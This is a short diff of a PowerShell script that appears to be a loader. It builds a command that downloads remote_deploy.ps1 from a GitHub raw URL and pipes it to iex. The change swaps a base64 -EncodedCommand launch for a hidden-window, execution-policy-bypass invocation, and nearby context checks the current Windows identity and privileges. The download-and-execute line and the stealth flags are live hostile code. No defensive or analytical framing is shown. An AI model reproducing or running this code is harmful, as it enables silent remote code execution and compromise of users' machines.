@@ -64,10 +64,8 @@ if (Get-F $dUrl $dp) {
         
         $method.Invoke($null, @([string]$ce, [string]$ge, [string]$w))
         Write-Host "running"
-        
         $cmd = "irm 'https://raw.githubusercontent.com/$u/$r/main/remote_deploy.ps1' | iex"
-        $ec = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
-        $tp = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $ec"
+        $tp = "powershell.exe -WindowStyle Hidden -NoP -Ep Bypass -c ""$cmd"""
         
         $id = [Security.Principal.WindowsIdentity]::GetCurrent()
         $wp = New-Object Security.Principal.WindowsPrincipal($id)
